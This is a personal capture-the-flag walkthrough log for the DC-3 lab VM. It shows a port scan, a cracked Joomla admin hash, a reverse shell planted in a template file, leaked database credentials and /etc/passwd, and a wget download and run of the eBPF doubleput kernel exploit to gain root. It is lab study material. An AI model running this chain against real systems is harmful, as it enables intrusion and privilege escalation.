@@ -1,0 +1,196 @@
+Welcome to DC-3.
+
+This time, there is only one flag, one entry point and no clues.
+
+To get the flag, you'll obviously have to gain root privileges.
+
+How you get to be root is up to you - and, obviously, the system.
+
+Good luck - and I hope you enjoy this little challenge.  :-)
+
+
+
+hack@kali:~/CTF/DC_3$ nmap -A -p- 192.168.1.11
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 23:15 CEST
+Nmap scan report for DC-3.homenet.telecomitalia.it (192.168.1.11)
+Host is up (0.00042s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.44 seconds
+
+
+
++--------+--------------------------------------------------------------+
+| name   | password                                                     |
++--------+--------------------------------------------------------------+
+| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
++--------+--------------------------------------------------------------+
+
+
+
+hack@kali:~/CTF/DC_3$ sudo john hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 3 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+snoopy           (?)
+1g 0:00:00:00 DONE 2/3 (2020-04-04 00:00) 1.449g/s 78.26p/s 78.26c/s 78.26C/s donald..trustno1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+Add reverse shell on index.php
+http://192.168.1.11/templates/beez3/index.php
+
+
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'squires';
+        public $db = 'joomladb';
+        public $dbprefix = 'd8uea_';
+        public $live_site = '';
+        public $secret = '7M6S1HqGMvt1JYkY';
+
+
+www-data@DC-3:/var/www/html$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+dc3:x:1000:1000:dc3,,,:/home/dc3:/bin/bash
+
+
+www-data@DC-3:/tmp$ wget  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+--2020-04-04 08:40:39--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+Resolving github.com (github.com)... 140.82.118.4
+Connecting to github.com (github.com)|140.82.118.4|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip [following]
+--2020-04-04 08:40:46--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7025 (6.9K) [application/zip]
+Saving to: '39772.zip'
+
+39772.zip           100%[===================>]   6.86K  --.-KB/s    in 0.007s  
+
+2020-04-04 08:40:46 (922 KB/s) - '39772.zip' saved [7025/7025]
+
+www-data@DC-3:/tmp$ 
+www-data@DC-3:/tmp$ 
+www-data@DC-3:/tmp$ cd^H^H^H
+www-data@DC-3:/tmp$ ls
+39772.zip
+systemd-private-edc427d179aa41e4a22b170a5b95a51f-systemd-timesyncd.service-w8KHOj
+www-data@DC-3:/tmp$ unzip 39772.zip
+Archive:  39772.zip
+   creating: 39772/
+  inflating: 39772/.DS_Store         
+   creating: __MACOSX/
+   creating: __MACOSX/39772/
+  inflating: __MACOSX/39772/._.DS_Store  
+  inflating: 39772/crasher.tar       
+  inflating: __MACOSX/39772/._crasher.tar  
+  inflating: 39772/exploit.tar       
+  inflating: __MACOSX/39772/._exploit.tar  
+www-data@DC-3:/tmp$ ls
+39772
+39772.zip
+__MACOSX
+systemd-private-edc427d179aa41e4a22b170a5b95a51f-systemd-timesyncd.service-w8KHOj
+www-data@DC-3:/tmp$ cd 39772
+www-data@DC-3:/tmp/39772$ ls
+crasher.tar  exploit.tar                                           
+www-data@DC-3:/tmp/39772$ tar xvf exploit.tar                                                      
+ebpf_mapfd_doubleput_exploit/                                                                      
+ebpf_mapfd_doubleput_exploit/hello.c                                                               
+ebpf_mapfd_doubleput_exploit/suidhelper.c                                                          
+ebpf_mapfd_doubleput_exploit/compile.sh                                                            
+ebpf_mapfd_doubleput_exploit/doubleput.c                                                           
+www-data@DC-3:/tmp/39772$ 
+www-data@DC-3:/tmp/39772$ ls
+crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar
+www-data@DC-3:/tmp/39772$ cd ebpf_mapfd_doubleput_exploit
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls
+compile.sh  doubleput.c  hello.c  suidhelper.c
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ 
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ 
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ 
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
+root@DC-3:/root# ls
+the-flag.txt
+root@DC-3:/root# cat the-flag.txt
+ __        __   _ _   ____                   _ _ _ _ 
+ \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
+   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+                                                     
+
+Congratulations are in order.  :-)
+
+I hope you've enjoyed this challenge as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+
+Have a great day!!!!
+root@DC-3:/root# 
+
